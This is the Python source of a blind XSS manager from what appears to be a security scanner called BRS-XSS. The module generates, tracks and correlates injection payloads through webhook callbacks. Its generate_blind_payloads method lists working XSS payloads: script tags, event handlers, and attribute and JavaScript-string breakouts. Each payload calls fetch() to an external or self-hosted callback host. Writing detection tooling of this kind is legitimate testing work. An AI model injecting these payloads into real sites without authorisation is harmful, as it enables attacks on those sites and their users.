#!/usr/bin/env python3

"""
BRS-XSS Blind XSS Manager

Manages webhook-based blind XSS detection and payload tracking.
Integrates with CallbackServer for self-hosted detection.

Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Created: Tue 05 Aug 2025 17:48:16 MSK
Modified: Thu 26 Dec 2025 20:50:00 UTC
"""

import uuid
import time
from typing import Any, Optional
from dataclasses import dataclass
from urllib.parse import urlencode

from .callback_server import CallbackServer, get_callback_server
from ..utils.logger import Logger

logger = Logger("core.blind_xss")


@dataclass
class BlindXSSPayload:
    """Blind XSS payload with tracking information"""

    payload_id: str
    payload: str
    webhook_url: str
    target_url: str
    parameter: str
    timestamp: float
    context_type: str = "unknown"


@dataclass
class BlindXSSDetection:
    """Blind XSS detection result"""

    payload_id: str
    detected_at: float
    callback_data: dict[str, Any]
    confidence: float = 1.0


class BlindXSSManager:
    """
    Manages blind XSS detection through webhook callbacks.

    Features:
    - Unique payload ID generation
    - Webhook URL integration (external or self-hosted)
    - Payload tracking and correlation
    - Automatic detection reporting
    - Integration with CallbackServer for self-hosted detection
    """

    def __init__(
        self,
        webhook_base_url: str = "https://xss.easypro.tech",
        use_callback_server: bool = False,
        callback_server: Optional[CallbackServer] = None,
    ):
        """
        Initialize Blind XSS manager.

        Args:
            webhook_base_url: External webhook URL for tracking
            use_callback_server: Use self-hosted CallbackServer
            callback_server: Existing CallbackServer instance
        """
        self.webhook_base_url = webhook_base_url.rstrip("/")
        self.use_callback_server = use_callback_server
        self.callback_server = callback_server
        self.active_payloads: dict[str, BlindXSSPayload] = {}
        self.detections: list[BlindXSSDetection] = []

        if use_callback_server and not callback_server:
            self.callback_server = get_callback_server()

        mode = "CallbackServer" if use_callback_server else "external webhook"
        logger.info(
            f"Blind XSS manager initialized with {mode}: {self.webhook_base_url}"
        )

    def generate_payload_id(self) -> str:
        """Generate unique payload ID"""
        return str(uuid.uuid4())[:8]

    def create_webhook_url(self, payload_id: str, context: str = "xss") -> str:
        """Create webhook URL for payload tracking"""
        if self.use_callback_server and self.callback_server:
            # Use self-hosted callback server
            return f"http://{self.callback_server.host}:{self.callback_server.port}{self.callback_server.callback_path}?t={payload_id}"
        else:
            # Use external webhook
            params = {
                "id": payload_id,
                "context": context,
                "timestamp": int(time.time()),
            }
            return f"{self.webhook_base_url}/?{urlencode(params)}"

    def generate_blind_payloads(self, context_type: str = "html") -> list[str]:
        """Generate blind XSS payloads with tracking"""
        payload_id = self.generate_payload_id()
        webhook_url = self.create_webhook_url(payload_id, context_type)

        # Base payloads with webhook integration
        base_payloads = [
            # Standard script injection
            f'<script src="{webhook_url}"></script>',
            f'<script>fetch("{webhook_url}")</script>',
            f"<img src=x onerror=\"fetch('{webhook_url}')\">",
            # Event handlers
            f"<svg onload=\"fetch('{webhook_url}')\">",
            f"<body onload=\"fetch('{webhook_url}')\">",
            f"<input onfocus=\"fetch('{webhook_url}')\" autofocus>",
            # JavaScript protocol
            f'javascript:fetch("{webhook_url}")',
            # CSS-based (for style contexts)
            f'</style><script>fetch("{webhook_url}")</script><style>',
            # Template injection
            f'{{{{fetch("{webhook_url}")}}}}',
            f'${{fetch("{webhook_url}")}}',
            # XML/XSLT
            f"<xsl:value-of select=\"fetch('{webhook_url}')\" />",
        ]

        # Context-specific optimizations
        if context_type == "attribute":
            base_payloads.extend(
                [
                    f'" onfocus="fetch(\'{webhook_url}\')" autofocus="',
                    f"' onmouseover=\"fetch('{webhook_url}')\" '",
                ]
            )
        elif context_type == "javascript":
            base_payloads.extend(
                [
                    f'";fetch("{webhook_url}");//',
                    f'\';fetch("{webhook_url}");//',
                    f'`);fetch("{webhook_url}");//',
                ]
            )
        elif context_type == "css":
            base_payloads.extend(
                [
                    f'</style><script>fetch("{webhook_url}")</script><style>',
                    f'expression(fetch("{webhook_url}"))',
                ]
            )

        return base_payloads

    def track_payload(
        self,
        payload_id: str,
        payload: str,
        target_url: str,
        parameter: str,
        context_type: str = "unknown",
    ) -> None:
        """Track active blind XSS payload"""
        blind_payload = BlindXSSPayload(
            payload_id=payload_id,
            payload=payload,
            webhook_url=self.create_webhook_url(payload_id),
            target_url=target_url,
            parameter=parameter,
            timestamp=time.time(),
            context_type=context_type,
        )

        self.active_payloads[payload_id] = blind_payload
        logger.debug(
            f"Tracking blind XSS payload {payload_id} for {target_url}#{parameter}"
        )

    def report_detection(
        self, payload_id: str, callback_data: dict[str, Any]
    ) -> BlindXSSDetection:
        """Report blind XSS detection from webhook callback"""
        detection = BlindXSSDetection(
            payload_id=payload_id,
            detected_at=time.time(),
            callback_data=callback_data,
            confidence=1.0,
        )

        self.detections.append(detection)
        logger.success(f"Blind XSS detected! Payload ID: {payload_id}")

        return detection

    def get_active_payloads(self) -> dict[str, BlindXSSPayload]:
        """Get all active tracked payloads"""
        return self.active_payloads.copy()

    def get_detections(self) -> list[BlindXSSDetection]:
        """Get all detections"""
        return self.detections.copy()

    def cleanup_old_payloads(self, max_age_hours: int = 24) -> int:
        """Clean up old payloads beyond retention period"""
        current_time = time.time()
        max_age_seconds = max_age_hours * 3600

        old_payloads = [
            payload_id
            for payload_id, payload in self.active_payloads.items()
            if current_time - payload.timestamp > max_age_seconds
        ]

        for payload_id in old_payloads:
            del self.active_payloads[payload_id]

        if old_payloads:
            logger.info(f"Cleaned up {len(old_payloads)} old blind XSS payloads")

        return len(old_payloads)

    def get_statistics(self) -> dict[str, Any]:
        """Get blind XSS manager statistics"""
        return {
            "active_payloads": len(self.active_payloads),
            "total_detections": len(self.detections),
            "webhook_base_url": self.webhook_base_url,
            "oldest_payload_age": (
                time.time() - min(p.timestamp for p in self.active_payloads.values())
                if self.active_payloads
                else 0
            )
            / 3600,  # hours
            "detection_rate": (
                len(self.detections) / len(self.active_payloads)
                if self.active_payloads
                else 0
            ),
        }
